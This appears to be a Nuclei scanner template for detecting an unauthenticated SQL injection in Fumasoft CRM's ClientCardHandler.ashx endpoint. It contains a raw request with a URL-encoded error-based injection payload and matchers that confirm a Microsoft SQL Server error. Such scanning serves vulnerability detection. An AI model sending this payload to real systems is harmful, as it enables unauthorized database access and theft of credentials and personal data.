id: fumasoft-ClientCardHandler-sqli
info:
  name: 孚盟云CRM ClientCardHandler.ashx SQL注入漏洞
  author: leadlife
  severity: high
  description: 上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云ClientCardHandler.ashx接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: 
    - demo
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: sqli,fumasoft

http:
  - raw:
      - |
        GET /m/Dingding/Ajax/ClientCardHandler.ashx?method=getCardImage&FID=%31%27%61%6e%64%20%31%3c%40%40%76%65%72%73%69%6f%6e%2d%2d HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
        Content-Length: 2

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'Microsoft SQL Server')
        condition: and